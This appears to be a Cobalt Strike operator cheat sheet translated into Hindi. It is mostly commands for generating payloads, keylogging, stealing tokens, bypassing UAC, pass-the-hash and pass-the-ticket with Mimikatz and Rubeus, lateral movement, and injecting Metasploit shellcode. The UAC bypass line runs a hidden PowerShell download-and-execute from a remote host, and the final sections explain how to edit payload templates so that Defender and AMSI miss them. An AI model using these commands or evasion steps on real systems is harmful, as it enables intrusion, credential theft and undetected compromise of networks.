# Cobalt Strike

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` फिर आप चुन सकते हैं कि कहाँ सुनना है, किस प्रकार का बीकन उपयोग करना है (http, dns, smb...) और अधिक।

### Peer2Peer Listeners

इन लिस्नर्स के बीकन को सीधे C2 से बात करने की आवश्यकता नहीं है, वे अन्य बीकनों के माध्यम से इसके साथ संवाद कर सकते हैं।

`Cobalt Strike -> Listeners -> Add/Edit` फिर आपको TCP या SMB बीकन का चयन करना होगा।

* **TCP बीकन चयनित पोर्ट में एक लिस्नर सेट करेगा**। TCP बीकन से कनेक्ट करने के लिए दूसरे बीकन से `connect <ip> <port>` कमांड का उपयोग करें।
* **smb बीकन चयनित नाम के साथ एक पिपेनाम में सुनता है**। SMB बीकन से कनेक्ट करने के लिए आपको `link [target] [pipe]` कमांड का उपयोग करना होगा।

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`&#x20;

* **`HTMLApplication`** HTA फ़ाइलों के लिए
* **`MS Office Macro`** एक ऑफिस दस्तावेज़ के लिए जिसमें एक मैक्रो है
* **`Windows Executable`** एक .exe, .dll या सेवा .exe के लिए
* **`Windows Executable (S)`** एक **stageless** .exe, .dll या सेवा .exe के लिए (stageless को staged से बेहतर माना जाता है, कम IoCs)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` यह कोबाल्ट स्ट्राइक से बीकन डाउनलोड करने के लिए bitsadmin, exe, powershell और python जैसे प्रारूपों में एक स्क्रिप्ट/एक्जीक्यूटेबल उत्पन्न करेगा।

#### Host Payloads

यदि आपके पास पहले से वह फ़ाइल है जिसे आप वेब सर्वर में होस्ट करना चाहते हैं, तो बस `Attacks -> Web Drive-by -> Host File` पर जाएं और होस्ट करने के लिए फ़ाइल का चयन करें और वेब सर्वर कॉन्फ़िगरेशन करें।

### Beacon Options

<pre class="language-bash"><code class="lang-bash"># Execute local .NET binary
execute-assembly &#x3C;/path/to/executable.exe>

# Screenshots
printscreen    # PrintScr विधि के माध्यम से एकल स्क्रीनशॉट लें
screenshot     # एकल स्क्रीनशॉट लें
screenwatch    # डेस्कटॉप के नियमित स्क्रीनशॉट लें
## उन्हें देखने के लिए View -> Screenshots पर जाएं

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes पर जाएं ताकि दबाए गए कुंजियों को देख सकें

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # किसी अन्य प्रक्रिया के अंदर पोर्टस्कैन क्रिया को इंजेक्ट करें
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
# Powershell मॉड्यूल आयात करें
powershell-import C:\path\to\PowerView.ps1
powershell &#x3C;बस यहाँ powershell cmd लिखें>

# User impersonation
## क्रेड्स के साथ टोकन जनरेशन
make_token [DOMAIN\user] [password] # नेटवर्क में एक उपयोगकर्ता का अनुकरण करने के लिए टोकन बनाएं
ls \\computer_name\c$ # कंप्यूटर में C$ तक पहुँचने के लिए जनरेटेड टोकन का उपयोग करने का प्रयास करें
rev2self # make_token के साथ जनरेटेड टोकन का उपयोग करना बंद करें
## make_token का उपयोग करने से घटना 4624 उत्पन्न होती है: एक खाता सफलतापूर्वक लॉग ऑन हुआ। यह घटना Windows डोमेन में बहुत सामान्य है, लेकिन लॉगऑन प्रकार पर फ़िल्टर करके इसे संकीर्ण किया जा सकता है। जैसा कि ऊपर उल्लेख किया गया है, यह LOGON32_LOGON_NEW_CREDENTIALS का उपयोग करता है जो प्रकार 9 है।

# UAC Bypass
elevate svc-exe &#x3C;listener>
elevate uac-token-duplication &#x3C;listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## PID से टोकन चुराना
## make_token की तरह लेकिन एक प्रक्रिया से टोकन चुराना
steal_token [pid] # इसके अलावा, यह नेटवर्क क्रियाओं के लिए उपयोगी है, स्थानीय क्रियाओं के लिए नहीं
## API दस्तावेज़ से हमें पता है कि यह लॉगऑन प्रकार "caller को अपने वर्तमान टोकन को क्लोन करने की अनुमति देता है"। यही कारण है कि बीकन आउटपुट कहता है Impersonated &#x3C;current_username> - यह हमारे अपने क्लोन किए गए टोकन का अनुकरण कर रहा है।
ls \\computer_name\c$ # कंप्यूटर में C$ तक पहुँचने के लिए जनरेटेड टोकन का उपयोग करने का प्रयास करें
rev2self # steal_token से टोकन का उपयोग करना बंद करें

## नए क्रेडेंशियल्स के साथ प्रक्रिया लॉन्च करें
spawnas [domain\username] [password] [listener] # ऐसा किसी निर्देशिका से करें जिसमें पढ़ने की अनुमति हो जैसे: cd C:\
## make_token की तरह, यह Windows घटना 4624 उत्पन्न करेगा: एक खाता सफलतापूर्वक लॉग ऑन हुआ लेकिन लॉगऑन प्रकार 2 (LOGON32_LOGON_INTERACTIVE) के साथ। यह कॉलिंग उपयोगकर्ता (TargetUserName) और अनुकरण किए गए उपयोगकर्ता (TargetOutboundUserName) का विवरण देगा।

## प्रक्रिया में इंजेक्ट करें
inject [pid] [x64|x86] [listener]
## OpSec के दृष्टिकोण से: जब तक आपको वास्तव में आवश्यकता न हो, क्रॉस-प्लेटफ़ॉर्म इंजेक्शन न करें (जैसे x86 -> x64 या x64 -> x86)।

## Pass the hash
## इस संशोधन प्रक्रिया के लिए LSASS मेमोरी का पैचिंग आवश्यक है जो एक उच्च-जोखिम क्रिया है, स्थानीय व्यवस्थापक विशेषाधिकार की आवश्यकता होती है और यदि प्रोटेक्टेड प्रोसेस लाइट (PPL) सक्षम है तो यह सभी तरह से व्यवहार्य नहीं है।
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Mimikatz के माध्यम से हैश पास करें
mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"
## /run के बिना, mimikatz एक cmd.exe उत्पन्न करता है, यदि आप एक उपयोगकर्ता के रूप में डेस्कटॉप पर चल रहे हैं, तो वह शेल देखेगा (यदि आप SYSTEM के रूप में चल रहे हैं तो आप ठीक हैं)
steal_token &#x3C;pid> # Mimikatz द्वारा बनाई गई प्रक्रिया से टोकन चुराएं

## टिकट पास करें
## एक टिकट का अनुरोध करें
execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;username> /domain:&#x3C;domain> /aes256:&#x3C;aes_keys> /nowrap /opsec
## नए टिकट के साथ उपयोग करने के लिए एक नया लॉगऑन सत्र बनाएं (समझौता किए गए को अधिलेखित न करने के लिए)
make_token &#x3C;domain>\&#x3C;username> DummyPass
## एक पॉवशेल सत्र से हमलावर मशीन में टिकट लिखें &#x26; इसे लोड करें
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## SYSTEM से टिकट पास करें
## टिकट के साथ एक नई प्रक्रिया उत्पन्न करें
execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;USERNAME> /domain:&#x3C;DOMAIN> /aes256:&#x3C;AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## उस प्रक्रिया से टोकन चुराएं
steal_token &#x3C;pid>

## टिकट निकालें + टिकट पास करें
### टिकटों की सूची
execute-assembly C:\path\Rubeus.exe triage
### LUID द्वारा दिलचस्प टिकट डंप करें
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:&#x3C;luid> /nowrap
### नए लॉगऑन सत्र का निर्माण करें, LUID और प्रक्रिया आईडी नोट करें
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### जनरेटेड लॉगऑन सत्र में टिकट डालें
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### अंततः, उस नए प्रक्रिया से टोकन चुराएं
steal_token &#x3C;pid>

# Lateral Movement
## यदि एक टोकन बनाया गया है, तो इसका उपयोग किया जाएगा
jump [method] [target] [listener]
## विधियाँ:
## psexec                    x86   एक सेवा को सेवा EXE आर्टिफैक्ट चलाने के लिए उपयोग करें
## psexec64                  x64   एक सेवा को सेवा EXE आर्टिफैक्ट चलाने के लिए उपयोग करें
## psexec_psh                x86   एक सेवा को PowerShell एक-लाइनर चलाने के लिए उपयोग करें
## winrm                     x86   WinRM के माध्यम से PowerShell स्क्रिप्ट चलाएँ
## winrm64                   x64   WinRM के माध्यम से PowerShell स्क्रिप्ट चलाएँ

remote-exec [method] [target] [command]
## विधियाँ:
<strong>## psexec                          सेवा नियंत्रण प्रबंधक के माध्यम से दूरस्थ निष्पादन
</strong>## winrm                           WinRM (PowerShell) के माध्यम से दूरस्थ निष्पादन
## wmi                             WMI के माध्यम से दूरस्थ निष्पादन

## WMI के साथ एक बीकन निष्पादित करने के लिए (यह जंप कमांड में नहीं है) बस बीकन अपलोड करें और इसे निष्पादित करें
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## Metasploit होस्ट पर
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## कोबाल्ट पर: Listeners > Add और Payload को Foreign HTTP पर सेट करें। Host को 10.10.5.120 पर सेट करें, Port को 8080 पर सेट करें और Save पर क्लिक करें।
beacon> spawn metasploit
## आप केवल विदेशी लिस्नर के साथ x86 Meterpreter सत्र उत्पन्न कर सकते हैं।

# Pass session to Metasploit - Through shellcode injection
## Metasploit होस्ट पर
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
## msfvenom चलाएँ और multi/handler लिस्नर तैयार करें

## बिन फ़ाइल को कोबाल्ट स्ट्राइक होस्ट पर कॉपी करें
ps
shinject &#x3C;pid> x64 C:\Payloads\msf.bin # x64 प्रक्रिया में मेटास्प्लोइट शेलकोड इंजेक्ट करें

# Pass metasploit session to cobalt strike
## स्टेजलेस बीकन शेलकोड उत्पन्न करें, Attacks > Packages > Windows Executable (S) पर जाएं, इच्छित लिस्नर का चयन करें, आउटपुट प्रकार के रूप में Raw का चयन करें और x64 payload का उपयोग करें।
## मेटास्प्लोइट में post/windows/manage/shellcode_inject का उपयोग करें ताकि उत्पन्न कोबाल्ट स्ट्राइक शेलकोड को इंजेक्ट किया जा सके


# Pivoting
## टीम सर्वर में एक सॉक्स प्रॉक्सी खोलें
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password</code></pre>

## AVs से बचना

### Artifact Kit

आमतौर पर `/opt/cobaltstrike/artifact-kit` में आप कोड और प्री-कंपाइल किए गए टेम्पलेट ( `/src-common` में) पा सकते हैं जो कोबाल्ट स्ट्राइक बाइनरी बीकन उत्पन्न करने के लिए उपयोग करेगा।

[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) का उपयोग करके उत्पन्न बैकडोर (या केवल संकलित टेम्पलेट के साथ) आप यह पता लगा सकते हैं कि क्या डिफेंडर को ट्रिगर कर रहा है। यह आमतौर पर एक स्ट्रिंग होती है। इसलिए आप बस उस कोड को संशोधित कर सकते हैं जो बैकडोर उत्पन्न कर रहा है ताकि वह स्ट्रिंग अंतिम बाइनरी में न दिखाई दे।

कोड को संशोधित करने के बाद, बस उसी निर्देशिका से `./build.sh` चलाएँ और `dist-pipe/` फ़ोल्डर को Windows क्लाइंट में `C:\Tools\cobaltstrike\ArtifactKit` में कॉपी करें।
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
`dist-pipe\artifact.cna` को लोड करना न भूलें ताकि Cobalt Strike को यह संकेत मिले कि हम कौन से संसाधनों का उपयोग करना चाहते हैं और कौन से लोड किए गए हैं।

### Resource Kit

ResourceKit फ़ोल्डर में Cobalt Strike के स्क्रिप्ट-आधारित पेलोड के लिए टेम्पलेट्स शामिल हैं, जिसमें PowerShell, VBA और HTA शामिल हैं।

[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) का उपयोग करके आप टेम्पलेट्स के साथ यह पता लगा सकते हैं कि डिफेंडर (इस मामले में AMSI) को क्या पसंद नहीं है और इसे संशोधित कर सकते हैं:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
पहचाने गए लाइनों को संशोधित करके एक ऐसा टेम्पलेट बनाया जा सकता है जो पकड़ा नहीं जाएगा।

`ResourceKit\resources.cna` नामक आक्रामक स्क्रिप्ट को लोड करना न भूलें ताकि Cobalt Strike को यह संकेत दिया जा सके कि हम डिस्क से उन संसाधनों का उपयोग करना चाहते हैं जो लोड किए गए हैं।
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

